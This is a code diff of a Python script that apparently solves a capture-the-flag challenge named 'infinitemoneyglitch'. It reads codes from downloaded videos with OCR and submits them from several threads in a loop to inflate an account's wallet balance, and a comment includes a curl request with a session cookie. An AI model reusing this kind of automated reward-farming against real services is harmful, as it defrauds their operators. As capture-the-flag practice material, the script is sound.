@@ -1,4 +1,3 @@
-`
 import cv2
 import pytesseract
 import re
@@ -92,4 +91,61 @@ def storeVideo(session, stream_link, uuid_video):
 def validateCode(session, uuid_video, code):
     headers = {
         'Content-Type': 'application/json',
-        'Re
+        'Referer': 'http://infinitemoneyglitch.chall.malicecyber.com/video',
+        'Origin': 'http://infinitemoneyglitch.chall.malicecyber.com',
+        'Accept-Encoding': 'gzip, deflate',
+    }
+    res = session.post('http://infinitemoneyglitch.chall.malicecyber.com/validate', headers=headers, json={"code": code, "uuid":uuid_video})
+    print(res.text)
+
+#curl 'http://infinitemoneyglitch.chall.malicecyber.com/account' --compressed -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://infinitemoneyglitch.chall.malicecyber.com/' -H 'Cookie: token=b451ce90-02d3-42ae-aadf-303662827d2d' -H 'Upgrade-Insecure-Requests: 1'
+def printWallet(session):
+    res = session.get('http://infinitemoneyglitch.chall.malicecyber.com/account')
+    m = regex_wallet.search(res.text)
+    if m is not None:
+        print("Wallet : {}".format(m.group(1)))
+
+def validateThread(session, elements_to_validate):
+    while True:
+        current_time = time.time()
+        element_to_remove = None
+        for el in elements_to_validate:
+            if (current_time-el["time"] > 20.0):
+                element_to_remove = el
+                break
+        if element_to_remove is not None:
+            validateCode(session, element_to_remove["uuid_video"], element_to_remove["code"])
+            with lock:
+                    #print("removed -> {}".format(element_to_remove))
+                    elements_to_validate.remove(element_to_remove)
+        time.sleep(0.1)
+
+def getAndProcessVideo(session, elements_to_validate):
+    stream_link, uuid_video = getVideo(session)
+    storeVideo(session, stream_link, uuid_video)
+    start = time.time()
+    code = processVideo(uuid_video+".mp4")
+    with lock:
+        elements_to_validate.append({"time": start, "uuid_video": uuid_video, "code": code})
+
+session = requests.Session()
+connectionToMoneyGlitch(session)
+print(session.cookies.get_dict())
+printWallet(session)
+tValidate = threading.Thread(target=validateThread, args=[session, elements_to_validate])
+tValidate.start()
+
+for i in range(0, 4):
+    tProcess = threading.Thread(target=getAndProcessVideo, args=[session, elements_to_validate])
+    tProcess.start()
+    arrayThread.append(tProcess)
+
+while True:
+    for i in range(0, 4):
+        if not arrayThread[i].is_alive():
+            arrayThread[i] = threading.Thread(target=getAndProcessVideo, args=[session, elements_to_validate])
+            arrayThread[i].start()
+    printWallet(session)
+    time.sleep(1.0)
+
+cv2.destroyAllWindows()
